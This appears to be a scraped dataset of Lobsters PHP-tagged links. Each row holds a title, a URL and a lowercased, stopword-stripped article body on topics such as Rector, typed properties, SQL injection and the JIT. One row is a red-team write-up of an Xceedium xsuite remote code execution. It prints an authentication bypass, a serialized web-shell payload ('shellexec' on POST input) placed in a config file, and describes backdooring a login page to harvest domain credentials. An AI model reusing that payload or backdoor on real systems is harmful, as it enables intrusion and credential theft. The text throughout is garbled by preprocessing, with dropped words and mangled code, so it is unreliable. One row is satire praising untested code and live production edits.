vendorbinrector process src note rectorphp loaded default different location use config option configuration php rectorphp declare use rectorcodequalityrectorifsimplifyifreturnboolrector use rectorcoreconfigurationoption use symfonycomponentdependencyinjectionloaderconfiguratorcontainerconfigurator return static function containerconfigurator containerconfigurator void parameter containerconfigurator parameter path refactor solid alternative cli argument parameter set option path dir src dir test file need skip parameter set option excludepaths single file dir srccomplicatedfilephp directory dir srccomplicatedfilephp fnmatch dir src test rector relies autoload setup project composer autoload included default add parameter set option autoloadpaths autoload specific file dir vendorsquizlabsphpcodesnifferautoloadphp full directory dir vendorprojectwithoutcomposer single rule nt like set use parameter set option excluderectors simplifyifreturnboolrector class php version different one refactor default php version parameter set option phpversionfeatures auto import fully qualified class name default false parameter set option autoimportnames true skip root namespace class like datetime exception default true parameter set option importshortclasses false skip class used php docblocks like var someclass default true parameter set option importdocblocks false ignore rector rule file infile exclusion use norector fqn name annotation class someclass norector const name norector public function foo norector rectordeadcoderectorplusremovedeadzeroandoneoperationrector round run rector rule config includes many set rector might want run single rector argument allows eg vendorbinrector process src set solid rectorsolidrectorclassfinalizeclasseswithoutchildrenrector short class name vendorbinrector process src set solid finalizeclasseswithoutchildrenrector safe type experimental feature default type resolving setting docblocks taken seriously php rectorphp declare use rectorcoreconfigurationoption use symfonycomponentdependencyinjectionloaderconfiguratorcontainerconfigurator return static function containerconfigurator containerconfigurator void parameter containerconfigurator parameter default false parameter set option safetypes true eg typedpropertyrector rule skip case string defined docblock php class valueobject public value param string value public function construct value value value limit execution changed file execution limited changed file using process option matchgitdiff option filter file included configuration creating intersection file listed git diff vendorbinrector process src matchgitdiff option useful ci pullrequests change file symfony container work symfony rule need link container xml file php rectorphp declare use rectorcoreconfigurationoption use symfonycomponentdependencyinjectionloaderconfiguratorcontainerconfigurator return static function containerconfigurator containerconfigurator void parameter containerconfigurator parameter parameter set option symfonycontainerxmlpathparameter dir varcachedevappkerneldevdebugcontainerxml detailed documentation contribute see contribution guide run rector docker run rector project using docker docker run rm v pwd project rectorrector latest process projectsrc set dryrun note volume mounted pwd current directory project accessed later using rectorphp docker run rm v pwd project rectorrector latest process projectapp config projectrectorphp autoloadfile projectvendorautoloadphp dryrun debugging make sure xdebug installed configured add xdebug option running rector without xdebug use debug option print nested exception output community package use rector upgrade code add known drawback apply coding standard rector us nikicphpparser build technology called abstract syntax tree ast ast nt care space produce mallformatted code php docblock annotation project need coding standard tool set rule make refactored nice shiny nt coding standard tool add ec use prepared ecsafterrectorphp set
81,Lobsters,php,PHP programming,Typed properties in PHP,https://stitcher.io/blog/typed-properties-in-php-74,typed property php,typed property php post uninitialized default constructor type type coercion strict type type variance inheritance improved type variance full list twitter email newsletter twitter pr,typed property php typed class property added php provide major improvement php type system change fully optin non breaking previous version post look feature indepth first let start summarising important point available php scheduled released november available class require access modifier public protected private var type allowed except void callable look like action class foo public int public string b foo private foo prop protected static string static default unsure added benefit type recommend reading post first uninitialized looking fun stuff important aspect typed property essential talk first despite might think first sight following code valid class foo public int bar foo new foo even though value bar nt integer making object foo php throw error bar accessed vardump foo bar fatal error uncaught error typed property foo bar must accessed initialization read error message new kind variable state uninitialized bar nt type value would simply null type nullable though possible determine whether typed nullable property set simply forgotten uninitialized added four important thing remember uninitialized read uninitialized property result fatal error uninitialized state checked accessing property able create object uninitialized property even though type nonnullable write uninitialized property reading using unset typed property make uninitialized unsetting untyped property make null especially note following code uninitialised nonnullable property set constructing object valid class foo public int foo new foo foo uninitialized state checked reading value property type validation done writing mean sure invalid type ever end property value default constructor let take closer look typed value initialized case scalar type possible provide default value class foo public int bar public string baz null public array list note use null default type actually nullable might seem obvious legacy behaviour parameter default following allowed function passnull int null passnull null luckily confusing behaviour allowed typed property also note impossible default value object class type use constructor set default obvious place initialize typed value would course constructor class foo private int public function construct int also remember mentioned valid write uninitialized property outside constructor long nothing reading property uninitialized check performed type type exactly typed already mentioned typed property work class need access modifier var key word front available type almost type used except void callable void mean absence value make sense used type value callable however little nuanced see callable php written like callable method say following broken code class foo public callable callable public function construct callable callable class bar public foo foo public function construct foo new foo method private function method bar new bar bar foo callable example callable refers private bar method called within context foo problem decided add callable support big deal though closure valid type remember context constructed way list available type bool int float string array iterable object nullable self parent class interface coercion strict type php dynamic language love hate try coerce convert type whenever possible say pas string expect integer php try convert string automatically function coerce int coerce principle apply typed property following code valid convert class bar public int bar new bar bar nt like behaviour disabled declaring strict type declare bar new bar bar fatal error uncaught typeerror typed property bar must int string used type variance inheritance even though php introduced improved type variance typed property still invariant mean following valid class class b extends class foo public prop class bar extends foo public b prop fatal error type bar prop must class foo example nt seem significant take look following class foo public self prop class bar extends foo public self prop php replace self behind scene concrete class refers running code mean error thrown example way handle following class foo public foo prop class bar extends foo public foo prop speaking inheritance might find hard come good use case overwrite type inherited property agree sentiment worth noting possible change type inherited property access modifier also change private protected public following code valid class foo private int prop class bar extends foo public string prop however changing type nullable nonnullable reverse allowed class foo public int public int b class bar extends foo public int public int b fatal error type bar must int class foo like said start post typed property major addition php lot say suggest reading rfc know neat little detail new php probably want read full list change made feature added honest one best release long time worth time finally thought want share topic love hear reach via twitter email next time would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
82,Lobsters,php,PHP programming,Let’s play a game: what is the deadly bug here?,https://www.youtube.com/watch?v=MpeaSNERwQA,let play game deadly bug,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature let play game deadly bug youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature let play game deadly bug youtube
83,Lobsters,php,PHP programming,New article on PHP: Good Idea/ Bad Idea series: Dynamic data and SQL statements,https://artemix.org/blog/dynamic-data-and-sql-statements.html,new article php good idea bad idea series dynamic data sql statement,tari r alfaro comment php documentation article bad idea directly insert dynamic data sql request sql injection good idea using prepare mechanism securely efficiently pas dynamic data article linked additional step go preparation emulation data validation documentation different filter rule library final note mysql,edit added complete guide proper antiinjection measure thanks tari r alfaro comment often need make sql request work dynamicallyprovided content prepare mechanism php documentation allows one prepare sql request provided pdo virtually every sql tool prepared statement prepare standard rdbms mechanism want indepth explanation prepared statement make sure check article bad idea directly insert dynamic data sql request seen htmlspecialchars example lot occurences see dynamicallyinserted data like example php user post username db query select user username user creates issue rdbms wo nt able properly optimize request also wo nt able prevalidate content type field allows easy sql injection good idea using prepare mechanism securely efficiently pas dynamic data wo nt go detail preparing statement benefit see article linked preparing statement easy thing create request placeholder instead value documentation sql library give placeholder use execute request passing data used instead placeholder another approach manually bind value executing php approach simple php req db prepare select user username req execute username req db prepare select user username username req execute username username req db prepare select user username username req bindparam username username req execute additional step go part one give good base work really make thing foolproof possible need tweak bit preparation emulation first preparation mechanism real database construct need disable called emulation consists pdo library simulating preparation mechanism dbms nt decent preparation mechanism need set pdo configuration pdo emulateprepares false db setattribute pdo emulateprepares false data validation golden rule data handling never trust user properly handle form submission need another step trying even imagine inserting data database validation wo nt format data wo nt change anything every bit info received take compare set rule make sure everything expected sound complicated nt native php solution filtervar method work documentation show lot different filter rule use make sure receiving data expected bothersome lot library greatly simplify like library siriusphpvalidation final note mysql remember folk want store data mysql dbms need use type real type instead using real format encoded byte instead excludes lot character
84,Lobsters,php,PHP programming,PHP in 2019,https://stitcher.io/blog/php-in-2019,php,php php fractal bad design tl dr featurepacked source code history summarized php roundtable podcast php performance kinsta extensive benchmark suite framework ecosystem symfony laravel packagist website swoole amp reactphp add libuv core language read online employed jetbrains invest zend framework psalm phan phpstan adding static analysis engine pre closing twitter email newsletter twitter pr,php remember popular php fractal bad design blog post first time read working crappy place lot legacy php project article got wondering whether quit go something entirely different programming luckily able switch job shortly thereafter importantly php managed evolve quite bit since day today addressing people either programming php anymore stuck legacy project spoiler thing still suck today like almost every programming language quirk many core function still inconsistent method signature still confusing configuration setting still many developer writing crappy code nt know better today want look bright side let focus thing changed way write clean maintainable php code want ask set aside prejudice minute afterwards free think exactly php though chance surprised improvement made php last year tl dr php actively developed new release year php one featurepacked release ever performance since php era doubled tripled extremely active eco system framework package platform php lot new feature added past year language keep evolving tooling like static analyser matured past year keep growing update people asked show actual code happy say possible source code one hobby project written php laravel list hundred os package maintain office good example modern php project look like let start history summarized good measure let quickly review php release cycle today php php next version ever since late era core team try keep yearly release cycle succeeded past four year general every new release actively supported two year get one year security fix goal motivate php developer stay uptodate much possible small upgrade every year way easy making jump example active overview php timeline found lastly php latest release next one want know happened php listen php roundtable podcast way let debunk common misconception modern php php performance back day php performance average best though large part php core rewritten ground resulting two three time performance increase word nt suffice though let look benchmark luckily people spent lot time benchmarking php performance find kinsta good updated list ever since upgrade performance increased much php web application comparable case better performance web framework language take look extensive benchmark suite sure php framework wo nt outperform c rust equally performant django rail express framework ecosystem speaking framework php nt wordpress anymore let tell something professional php developer wordpress nt way representative contemporary ecosystem general two major web application framework smaller one symfony laravel sure also zend called lamina yii cake code igniter etc want know modern php development look like good one first two framework large ecosystem package product ranging admin panel crms standalone package ci profilers numerous service like web socket server queuing manager payment integration honestly much list framework meant actual development though need pure content management platform like wordpress craftcms improving one way measure current state php ecosystem look packagist main package repository php seen exponential growth million downloads day fair say php ecosystem nt small underdog used take look graph listing amount package version time also found packagist website besides application framework cm also seen rise asynchronous framework past year framework server written php language allow user run truly asynchronous php example include swoole amp reactphp since ventured async world stuff like web socket application lot io become actually relevant php world also talk internals mailing list place core developer discus development language add libuv core unaware libuv library nodejs us allow asynchronicity language async await available yet lot improvement language made past year nonexhaustive list new feature php topic language feature let also talk process language developed today active core team volunteer move language forward though community allowed propose rfcs next rfcs discussed internals mailing list also read online new language feature added must vote rfc least majority allowed core recently effort move rfc discussion github code actually life seems like small group developer actively invested php board read process still work progress people nt like github clear though active contributor board decision fair say rfc discussion process moved github entirely within next year rfc discussed go voting phase probably around people allowed vote though required vote rfc member core team course allowed vote maintain code base besides group people individually picked php community people include maintainer php doc contributor php project whole prominent developer php community core development done voluntary basis one core php developer nikita popov recently employed jetbrains work language full time another example linux foundation recently decided invest zend framework called lamina employment acquisition like ensure stability future development php besides lot feature improvement added php core seen increase tool around past year come mind static analyser like psalm created vimeo phan phpstan tool statically analyse php code report type error possible bug etc way functionality provide compared typescript though language nt transpiled custom syntax allowed even though mean need rely docblocks rasmus lerdorf original creator php mention idea adding static analysis engine core would lot potential huge undertaking speaking transpiling inspired javascript community effort extend phps syntax user land project called pre exactly allow new php syntax transpiled normal php code idea proven javascript world could work php proper ide static analysis support provided interesting idea grow able call mainstream closing said feel free still think php crappy language language definitely drawback year legacy carry say confidence enjoy working experience able create reliable maintainable quality software client work happy end result still possible lot messed thing php say great choice web development used wise correct nt agree let know reach via twitter email would like stay date new content feel free subscribe newsletter follow twitter noticed tpyo submit pr fix
85,Lobsters,php,PHP programming,Summary for many PHP RFC and context about why some are not implemented (yet),https://github.com/Danack/RfcCodex,summary many php rfc context implemented yet,php codex rfc codex rfc codex php project coordination php project coordination php internals link php internals,php codex project part rfc codex summary previous rfc discussion php project coordination list work people either could working php internals link link develop php coreextensions rfc codex opinionated curated documentation previous rfc discussion failed result successful change php purpose information provide people summary certain idea failed get done future conversation far productive avoid people continually asking feature never get done curation opinionated going document discussion either thing bad idea unlikely happen curating nt likely worth anyone time reading rfc codex php project coordination nonopinionated set information people either could working related php core information opinionated add information thing people could working even nt agree behind work php project coordination php internals link set link contain useful information anyone looking develop php core php extension php internals
86,Lobsters,php,PHP programming,Swoole: Production-Grade Async programming Framework for PHP,https://www.swoole.co.uk/,swoole productiongrade async programming framework php,coroutine task,coroutine task php server new swoolehttpserver swoolebase server set workernum taskworkernum server request function request response use server task time task data wwwswoolecouk code result server taskco task response end pre task result varexport result true server task function swooleserver server taskid workerid data server workerid sleep data done time data workerid server workerid return data server start
87,Lobsters,php,PHP programming,From PHP to Java and back again: a retreat from microservices,https://allegro.tech/2019/04/from-php-to-java-and-back-again.html,php java back retreat microservices,allegro current situation rationale change migration positive effect conclusion,post published april taken seriously five year ago started major technological transformation allegro platform since moving monolithic mln line code php application system microservices new architecture however turned longer afford follow today april announce going back root hoping rewrite jvm microservices single php application end year current situation year microservices service running production written java kotlin based spring boot make dozen release production per day technical metric capture however complex system become need something radically simpler order stay top highly competitive market need simplicity reliability php rationale change biggest disappointment current jvm microservices architecture time take single feature land production serve user blame mostly statictyping java kotlin make code verbose encourages creating lot domainspecific type since low time market essential began value expressiveness php also php community le obsessed automatic testing result engineer waste le time writing test code time writing code actually end production experience technical debt work like financial debt problem long creative paying canary deployment standard php enables practice design easy accessing production machine via ssh modifying file terminal change available enduser right code written agile process allows engineer verify idea quickly submitting change main repository process used applying quick fix production java kotlin give u powerful tool dropping microservices architecture favor monolith also simplify infrastructure lot mean fewer application manage le orchestration needed around fewer people involved running system mean engineer actual productive work churning form website crafting jsons apis migration decided start small month ago selected engineering team transforming jvm microservices single php application help engineer adapt new technology providing dedicated training aiming rid bad habit jvm world one training session something call testing detox found many java kotlin engineer obsessed code covered automatic test finding hard engage compulsive test writing testing detox session practice creating huge amount code without single test case see nothing bad happens behavioural psychologist leading session make sure engineer support need also help transitioning microservices monolithic architecture organizing group meditation engineer allows incorporate spirit solidarity unity desperately need daytoday work overall migration going smoothly migrated microservices first month soon ensure engineering team adopts new approach positive effect seen lot positive effect several team already working new architecture first large number engineer committing one repository help introduce diffusion responsibility culture lead engineer overly concerned product keep relaxed productive engineer also become productive develop code lightweight editor like vim emacs instead using memoryconsuming tool like intellij allows code memorydemanding slack communicator open time user also seem satisfied change used new feature available couple time week get stable release month mean le cognitive load sense security hope release even longer iteration future lastly adopting php widespread startup hope prove say startup culture really mean conclusion started journey back php monolith excited result believe become trend company become disillusioned microservices jvm language rumor google working support php cloud function php monolith seems technology choice future
88,Lobsters,php,PHP programming,PHP GR8,https://blog.krakjoe.ninja/2019/03/php-gr8.html,php,jit php need jit jit make website faster earth io cpu bound mean cpu bound php look like zendbenchphp php make ultimate tradeoff make math faster ca nt php development php slow,fig chap performing detroit jit unless living rock past case welcome aware jit coming php vote ended quietly today vast majority favour merging php official throw crazy shape celebration suggestion given fig even called detroit jit sit read following myth busting article going clear confusion around jit benefit delve work little nt want bored since nt know talking going start beginning simple question work complex one already sure know answer question heading skip part jit php implement virtual machine kind virtual processor call zend vm php compiles human readable script instruction virtual machine understands call opcodes stage execution refer compile time runtime stage execution virtual machine zend vm executes code instruction opcodes work well tool like apc past opcache today cache code instruction opcodes compile time happens must first one line explain jit general justintime compiler strategy take intermediate representation code turn architecture dependent machine code runtime justintime execution php mean jit treat instruction generated zend vm intermediate representation emits architecture dependent machine code host code longer zend vm cpu directly php need jit focus php internals community since slightly php performance brought healthy competition facebook hhvm project majority core change php contained phpng patch improved significantly way php utilizes memory cpu core since every one u forced keep one eye performance since php performance improvement made optimization hashtable core data structure php specialization zend vm certain opcodes specialization compiler certain sequence constant stream improvement optimizer component opcache many others besides boring list brute fact optimization take u far rapidly approaching maybe already met brick wall ability improve caveat say thing like ca nt improve really mean tradeoff would make improve longer look appealing whenever talk performance optimization talking tradeoff often tradeoff simplicity performance would like think simplest code fastest code simply case modern world c programming fastest code often code prepared take advantage architecture dependent intrinsics platform compiler dependent builtins simplicity guarantee best performance time ability php jit would appear best way squeeze performance php jit make website faster probability significantly maybe answer expecting general case application written php io bound jit work best cpu bound code earth io cpu bound mean want describe general performance characteristic piece code application use term io bound cpu bound simplest possible term io bound piece code would go faster could improve reduce optimize io cpu bound piece code would go faster could improve reduce optimize instruction cpu executing magically increase clock speed cpu piece code application may io bound cpu bound bound equally cpu io general php application tend io bound thing slowing io performing connecting reading writing database cache file socket cpu bound php look like cpu bound code something lot php programmer familiar nature php application job tends connect database possibly cache light lifting spit htmljsonxml response may look around codebase find lot code nothing whatever io code calling function completely disconnected io even confused seem implying nt make application cpu bound even though may many line code deal non io io php actually quite fast one fastest interpreted language world remarkable difference zend vm calling function nothing io making call machine code clearly difference fact machine code calling convention zend vm calling convention machine code prologue zend vm prologue whether call someclevelfunction zend opcodes machine code nt make significant difference performance application making call although may seem make significant difference call note calling convention roughly sequence instruction executed entering another function prologue sequence instruction executed entry another function calling convention case push argument onto stack prologue pop stack loop tail call x hear ask php actually quite smart optimizer component opcache enabled code transformed magic efficient form could written important note jit nt change calling convention zend function convention established vm zend must able switch jit vm mode time decision taken retain calling convention established vm result call see everywhere nt remarkably faster jit want see cpu bound php code look like look zendbenchphp obviously extreme example cpu bound code drive home point jit really shine area mathematics php make ultimate tradeoff make math faster widen scope php considerably without wanting toot horn web covered web programmer nt considered using php next project web wrong biased php developer opinion improve ability execute math faster php seems glance narrow scope however fact open door thing machine learning rendering gui rendering data analysis name ca nt php called jit ultimate tradeoff think arguably one complex compiler strategy ever invented maybe complex introduce jit introduce considerable complexity ask dmitry author jit made php complex would say hate complexity direct quote bottom complex anything understand moment internals developer le handful truly understand implementation jit php coming fast merging php would leave u version php le handful people could debug fix improve real sense acceptable situation people voted merging php time php many u working spare time understand jit still feature want implement tool need rewrite php first must understand jit need time grateful majority voter saw fit give u complex synonymous horrible complex beautiful like nebula jit kind complex principle fully understand something complex make marginal reduction apparent complexity thing word even internals developer familiar jit dmitry nt really change complex nature jit development php slow reason think enough time say confidence time php generally available enough u familiar jit function least well today come fixing bug pushing php forward trying square view jit inherently complex consider majority time spent introducing new feature actually spent discussing feature majority feature even fix code may take order minute hour write discussion take order week month rare case code feature may take order hour day write discussion always take longer rare case say enjoy weekend
89,Lobsters,php,PHP programming,TipiWiki (2003),http://beza1e1.tuxen.de/tipiwiki.html,tipiwiki,blog entry someone asks simple wiki tipiwiki still available put code repository github strict use code pbwiki self hosted wiki awesome list lobster submission code written still running,fifteen year ago published tipiwiki still school never really used abandoned decade however people grew big successful project tipiwiki default content still snippet pbwiki world largest consumer wiki farm according blog entry based tipiwiki true wonder code left asked support founder nathan schmidt answered quite busy pbwiki codebase grown php code original indexphp file php nt include image cs template etc one point recognizable element core filter function evolved quite bit ran line common including return filtered took primary developer david founder ceo late last year added sort thing journaled hotspare backup masterslave clustering file upload righttoleft support arabicchinesehebrew google yahoo ad placement paypal automation template automatic statistic generation u user list go shortly founder david weekly also mailed hi saw email sent support pbwiki originally based used starting point incredible simplicity liked whole system implemented efficiently cleanly made easy quickly start customizing great work point imagine system pretty wildly diverged tipiwiki may one two regular expression basically beast sadly nearly simple clean backend love technical advisor depending availability time computer science student available rejected believe quite intimidated request one year later david request continuing vigorous work pbwiki incorporated fckeditor offer wysiwyg user interface thinkhope make experience much better give whirl going ip review right constitutes well source base huge help u could written disclaimer giving u full permission use unrestricted commercial fashion even mail pbwiki tshirt like let know size address gave permission hundred line code maybe little kickstarter nothing crucial success deserved course literally say built foundation company got lousy tshirt ok nt lousy nice polo shirt whenever someone asks simple wiki reminded mine altough never seriously used back goal polish code good could would humiliated open sourcing github git used sourceforge tipiwiki still available without code would lost thanks sourceforge still hosting instance put online fifteen year ago although broken file permission redundancy put code repository github overall still consider code quite clean readable part indentation whitespace clean finicky today cute comment like assertation know name current page markup handmade regular expression markdown back let alone library use wikipedias markup already mess time page stored flat file older version stored file split next entry line today point view used sqlite probably know might even integrated php yet standardscompliant important back standard strict back quite proud code still think well done according standard back today test framework clear use code internet spam bot fill wiki quickly probably security problem want wiki better use pbwiki look self hosted wiki awesome list article triggered lobster submission code written still running thanks nathan schmidt permission publish mail sadly david weekly reply
90,Lobsters,php,PHP programming,Unique Rule SQL Injection Warning,https://blog.laravel.com/unique-rule-sql-injection-warning,unique rule sql injection warning,unique rule exclude id feature intended accept systemgenerated id autoincrementing id uuids generated application way documentation demonstrates using rule http ruleunique,yesterday received email security researcher pointing possibility sql injection user controlled input passed exclude id parameter laravel unique rule rule unique user ignore request input id unique rule exclude id feature intended accept systemgenerated id autoincrementing id uuids generated application way documentation demonstrates using rule rule unique user ignore user id however user depart documented usage feature allows user controlled data specify exclude id value column maliciously crafted request could lead sql injection attacktherefore added red warning unique validation rule documentation pointing rule used documented warning user allowing user controlled input parameter ruleit may possible framework prevent sql injection even developer accidentally allow user controlled input passed rule explore thoroughly upcoming laravel releasethe documentation rule may viewed http ruleunique
91,Lobsters,php,PHP programming,Remote Code Execution — Gaining Domain Admin privileges due to a typo,https://medium.com/@DanielC7/remote-code-execution-gaining-domain-admin-privileges-due-to-a-typo-dbf8773df767,remote code execution gaining domain admin privilege due typo,remote code execution gaining domain admin due typo note enumeration exploitdb article arbitrary file read opmreadsessionlogphp logfile etcpasswd road code execution http phpnetmanualenfunctiontrimphp exploitation echo shellexec urldecode post c conclusion,remote code execution gaining domain admin due apology clickbait title refrain creating custom website logo believe fair compromise short time ago part red team engagement found successfully exploited remote code execution vulnerability resulted u quickly gaining high privilege access customer internal network far nothing sound ordinary however interestingly root cause vulnerability due two character typo advisory found herenote realise blog post would much better included additional screenshots however want risk accidentally revealing information clientenumerationafter performing basic enumeration found subdomain belonging target organisation proudly stated powered xceedium xsuite bit googling stumbled across exploitdb article containing several vulnerability xsuite including unauthenticated command injection reflected crosssite scripting arbitrary file read local privilege escalation vulnerability easy right arbitrary file readunfortunately due target configuration command injection vulnerability work privilege escalation requires prior access device possible wanted avoid user interaction crosssite scripting nono left u arbitrary file read opmreadsessionlogphp logfile etcpasswdnaturally port could accessed internet despite able read various hash etcpasswd file useless u sshtel sscxrtt redacted sshtel tmp usrbintelnetsftpftp redacted homesftpftpat point believed best way forward find host documentroot start downloading source code could manually audit code intention finding additional vulnerability xceedium xsuite reading numerous apache configuration file documentroot found varwwwhtdocsuagwebso far know location two page varwwwhtdocsuagwebopmreadsessionlogphpvarwwwhtdocsuagwebloginphpthe source code file downloaded using arbitrary file read reviewed find reference php configuration file also downloaded whilst process could scripted decided since would auditing code may well manually retrieve source code auditing process also added benefit limiting request target host day manually downloading auditing php believed good enough understanding application work found bugsinteresting function addition rce outlined post vulnerability found along way additional arbitrary file read various sql injection issue could already read local file database appeared configured useless interest point rcethe road code executionone interesting function highlighted linkdb read content varuagconfigfailovercfg line line pass eval function mean somehow find method write php code failovercfg may able call linkdb function execute remote code host interesting currently control failovercfg contentsvarwwwhtdocsuagfunctionsdbphpfunction linkdb db dbtype action die global dbchoices syncon member sharedkey dbchoices dbchoices array mysql redacted redacted read file array save synccfg synccfg file varuagconfigfailovercfg iterates content array foreach synccfg line line trim line keyval explode line save content cmd variable cmd param keyval keyval evaluates content cmd variable eval cmd located functionality populates varuagconfigfailovercfg code modified slightly avoid including numerous line string parsing varwwwhtdocsuagfunctionsactiveactivecmdphpfunction putconfigs post file varuagconfigfailovercfg post unserialize post ignore err saveconfig file post summarise know content failovercfg passed eval may lead code execution know putconfigs function take parameter pass pass unserialize let pretend never saw save failovercfg need see post variable used putconfigs originates control itvarwwwhtdocsuagfunctionsactiveactivecmdphpfunction activeactivecmdexec get process requested commandswitch get cmdtype case checklist confirmconf get break case putconfs putconfigs get post break get parameter passed putconfigs originates parameter passed activeactivecmdexec functionvarwwwhtdocsuagfunctionsajaxcmdphpif get cmd actact isset get post match array pregmatch post server requesturi match get post match activeactivecmdexec get activeactivecmdexec take direct user input mean directly control input activeactivecmdexec passed putconfigs unserialize finally saved varuagconfigfailovercfg create serialized encoded request saved failovercfg afterwards invokelinkdb pas file containing malicious code eval achieved code thoughtas overwriting configuration file one mistake may brick device rather unhappy customer hand even brick device may get one chance writing config file decided err side caution took relevant part code test exploit locally attempt getting message bad shared key unfortunately overlooked something beginning activeactivecmdexec function varwwwhtdocsuagfunctionsactiveactivecmdphpfunction activeactivecmdexec get check provided shared key logres checksharedkey get sharedkey logres echo bad shared key exit function check valid shared key passed via get variable without legitimate key reach functionality necessary write code failovercfg file invokelinkdb evaluate code execute code remote point believed may time go back drawing board find new method attack host unsanitised user input passed unserialize perhaps fortunately ability read local file shared key may hard coded source code saved readable config file include key request pas check let check checksharedkey function see shared key savedvarwwwhtdocsuagfunctionsactiveactivecmdphpfunction checksharedkey sharedkey strlen sharedkey return false trim sharedkey return flase f file varuagconfigfailovercfg foreach f row row trim row row continue rowsp pregsplit row rowsp sharedkey sharedkey rowsp return true else return false function check key passed character length check key passed empty string read failovercfg file line line check provided shared key match shared key failovercfgso use arbitrary file read extract shared key varuagconfigfailovercfg file append request write serialised php code failovercfg invoke linkdb eval malicious code execute code remote host reading content failovercfg greeted following varuagconfigfailovercfgclustermembersactiveifacesharedkeystatusmyindexclusterstatusclusteripclusternatipclusterfqdnthe file emptywe steal existing key pas authentication check one configured failing turned attention back checksharedkey functionality first thing checksharedkey function check provided key character long mean simply pas blank key pas check may game however noticed subtle issue previously overlooked see varwwwhtdocsuagfunctionsactiveactivecmdphpfunction checksharedkey sharedkey strlen sharedkey return false trim sharedkey return flase due typographic error shared key provided character length empty call trim function return flase return literal string flase instead boolean value false fortunately u string flase boolean value true thus key check successful bypass authorisation checkreviewing php trim manual find following http phpnetmanualenfunctiontrimphpso theory use space tab line feed carriage return null byte vertical tab reach necessary code path required execute code somebody typed two character wrong way around word false test theory take relevant part code write small script utilises logic xsuite code phptake user input sharedkey get sharedkey echo user inputecho input sharedkey n echo string length hopefully echo sharedkey length strlen sharedkey n pas input checksharedkey function logres checksharedkey sharedkey echo raw returned valueecho raw returned value vardump logres echo boolean value returned valueecho boolen returned value vardump bool logres echo either bad shared key auth bypassed accordinglyif logres echo bad shared keyn exit else echo auth bypassed function checksharedkey sharedkey strlen sharedkey return false trim sharedkey return flase tested input see happened expected passing character random string return boolean value false bypass check try theory carriage returnsnull bytesetc predicted string composed carriage return null byte etc bypass checksharedkey functionality bypass authorisation check reach desired code path lot step exploit significant number thing may go wrong decided test exploit locally relevant codeexploitationafter testing locally following exploitation step refined poison failovercfg malicious code using sharedkey bypass ajaxcmdphp cmdactact cmdtypeputconfs sharedkey contest post parameter give following serialized payload radioiface iface clustermembers txsharedkey aaaabbbbccccdddxxaaabbbbccccdddd status clusterfqdn testdomain echo shellexec urldecode post c clusterip corresponds php object form data array data radioiface iface data clustermembers array data txsharedkey aaaabbbbccccdddxxaaabbbbccccdddd data status data clusterfqdn testdomain echo shellexec urldecode post c clusterip verify config file successfully poisoned reading back using arbitrary file read vulnerability invoke linkdb eval content failovercfg execute commandpost ajaxcmdphp cmdgetappletparams first discovering xceedium device appeared struck gold significantly outdated device publicly available exploit resulting rce naturally case successful compromise took significantly time effort originally expectedfor curious rest engagement went upon compromising device quickly discovered method gain root access device due nature xceedium xsuite identity access management hundred user authenticating device every day root access simply backdoored loginphp steal hundred domain credential fortunately u cleartext credential captured domainenterprise administrator allowed u complete access various domain across globe obviously goal red teaming gain domain administrator certainly help previously mentioned sorry screenshots showing actual attack however want risk outing client additionally time discovery intention releasing bug publicly finally wish could say xceedium ca technology treat work disclosure process however would lie
92,Lobsters,php,PHP programming,PHP linter that is written in Go,https://github.com/VKCOM/noverify,php linter written go,join github today sign file permalink noverify report issue go feature default lint user guide language server contribute good first issue topic resource license reload reload,pretty fast linter code static analysis utility php dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time noverify noverify php linter find possible bug style violation code noverify config reported issue phpdoc php code must fixed noverify aim understand php code least well phpstorm behaves incorrectly suboptimally please report issue tool written go us feature fast analyze locs line code per second core incremental analyze change git show new report indexing speed locs experimental language server v code editor support language server protocol auto fix warning fix flag provided default lint noverify default following check unreachable code array access nonarray type argument calling functionmethod call undefined functionmethod fetching undefined constantclass property class found phpdoc incorrect undefined variable variable always defined case without break syntax error unused variable incorrect access privateprotected element incorrect implementation iteratoraggregate interface incorrect array definition eg duplicate key user guide using noverify linter extending noverify using noverify php language server contribute find good first issue fix make pull request pretty fast linter code static analysis utility php topic resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
93,Lobsters,php,PHP programming,30% of Laravel code is Symfony (2017),https://medium.com/@javiereguiluz/30-of-laravel-code-is-symfony-a49dcf30e809,laravel code symfony,laravel code symfony symfony component creating project analyzing vendor directory cloc focus php code,laravel code symfonylaravel popular php framework used develop monolithic web application laravel known using lot thirdparty library mostly symfony component curious much code vendor provides laravel apps gathered statscreating projecti run following command recommended laravel doc create new laravel app composer createproject preferdist laravellaravel myprojectand default content vendor directory new unmodified laravel app default content vendor dir new laravel appanalyzing vendor directoryi used wellknown cloc command line utility count line vendor directory example output cloc vendorlaravel dir cloc text unique file file file line language file blank comment code php sum analysis focus php code ignore nonphp file type number blank comment line laravel apps contain line php code provided laravel result main vendor
94,Lobsters,php,PHP programming,CipherSweet: Searchable Encryption Doesn't Have to be Bitter,https://paragonie.com/blog/2019/01/ciphersweet-searchable-encryption-doesn-t-have-be-bitter,ciphersweet searchable encryption nt bitter,searchable encryption php sql ciphersweet secure chosenciphertext attack usability security property page useful challenge searchable encryption fully homomorphic encryption pixek seny kamara active cryptanalytic attack adaptive chosenciphertext attack small input domain leaking information sidechannels information leakage oracle leak plaintext block cipher ecb mode ciphersweet highlevel overview official documentation github get ciphersweet available github using ciphersweet backend fipscrypto moderncrypto backend key provider engine encryptedfield searchable encryption single column encryptedrow searchable encryption many column one table compound blind index encryptedmultirows searchable encryption many table ciphersweet usable cryptography win accordance cryptographically secure php best practice blind index planning blind index blog post detailing fundamental design straightforward information leakage profile bloom filter class compound blind index filter encrypted search result based boolean field first initial last name builtin key separation key hierarchy domain separation constant key rotation upcoming development ciphersweet roadmap php security python implementation ciphersweet support development ciphersweet enterprise support contract,back outlined fundamental searchable encryption php sql shortly implemented design library call ciphersweet initial design constraint follows use cryptography tool already widely available developer use encryption mode secure chosenciphertext attack treat usability security property remain loosely schemaagnostic possible possible use design nosql context wildly different sql database layout extensible may integrated many product service today like talk challenge encountered well feature landed ciphersweet since inception believe beneficial adoption usable cryptography scale familiar cryptography term may find page useful challenge searchable encryption time writing difficult declare state art design searchable encryption two reason different threat model operational requirement ongoing academic research different design attack cryptographer interested encrypted search engine likely 